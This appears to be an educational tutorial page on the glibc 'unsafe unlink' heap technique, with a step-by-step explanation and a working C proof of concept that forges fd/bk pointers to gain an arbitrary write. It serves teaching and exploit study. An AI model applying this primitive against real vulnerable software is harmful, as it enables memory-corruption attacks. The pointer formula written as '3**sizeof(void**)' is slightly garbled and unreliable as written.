---
title: "Unsafe Unlink"
description: "Exploiting the unlink macro to achieve arbitrary write by corrupting pointers."
date: "2025-12-26"
order: 32
---

# Unsafe Unlink

## Introduction

The `unlink` vulnerability occurs when a program can trigger the removal of a chunk from a doubly-linked list (like the unsorted, small, or large bins) while having control over the chunk's metadata (`fd` and `bk` pointers).

In modern glibc versions, a crucial check was introduced to prevent simple `unlink` attacks:
```c
if (__builtin_expect (p->fd->bk != p || p->bk->fd != p, 0))
  malloc_printerr ("unlink_chunk(): corrupted double-linked list");
```
To bypass this, we need a known pointer that points to our chunk. The most common scenario is a global pointer to a heap allocation.

## Prerequisites
- **Global Pointer**: Ability to find a known, static address (like a global variable) that contains a pointer to the target heap chunk.
- **Heap Overflow / UAF**: Ability to overwrite the `fd` and `bk` pointers of the target chunk.
- **Unlink Trigger**: Ability to trigger the `unlink` macro, typically by freeing an adjacent chunk to induce backward or forward consolidation.

## The Technique

The goal is to forge a fake chunk such that:
1. `P->fd->bk == P`
2. `P->bk->fd == P`

If we have a global pointer `P_ptr` that points to chunk `P`, we can set:
- `P->fd = &P_ptr - 3**sizeof(void**)`
- `P->bk = &P_ptr - 2**sizeof(void**)`

When `unlink(P)` is called:
- `FD = P->fd` (which is `&P_ptr - 3`)
- `BK = P->bk` (which is `&P_ptr - 2`)
- `FD->bk = BK` -> `*(&P_ptr - 3 + 3) = &P_ptr - 2` -> `P_ptr = &P_ptr - 2`
- `BK->fd = FD` -> `*(&P_ptr - 2 + 2) = &P_ptr - 3` -> `P_ptr = &P_ptr - 3`

The result is that `P_ptr` now points slightly before itself. We can then use `P_ptr` to overwrite itself with any address, achieving an arbitrary write primitive.

## Implementation Example

The following code (tested on Ubuntu 20.04) demonstrates the attack using a global pointer.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);

	int malloc_size = 0x420;
	int header_size = 2;

	chunk0_ptr = (uint64_t*) malloc(malloc_size);
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size);

	// 1. Forge fake chunk in chunk0
	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

	// 2. Corrupt chunk1 metadata
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	chunk1_hdr[0] = malloc_size;
	chunk1_hdr[1] &= ~1;

	// 3. Trigger unlink via backward consolidation
	free(chunk1_ptr);

	// 4. Achieve arbitrary write
	char victim_string[8];
	strcpy(victim_string,"Hello!~");

	chunk0_ptr[3] = (uint64_t) victim_string;
	chunk0_ptr[0] = 0x4141414142424242LL;

	assert(*(long *)victim_string == 0x4141414142424242L);
	return 0;
}
```

## Key Takeaways

- **Requirement**: A known location (usually global/static memory) containing a pointer to the chunk.
- **Capability**: Transforms a heap overflow/UAF into an arbitrary write.
- **Modern Defense**: Safe-linking and tcache often require bypassing or filling the tcache first before this technique can be used on bins that use `unlink`.
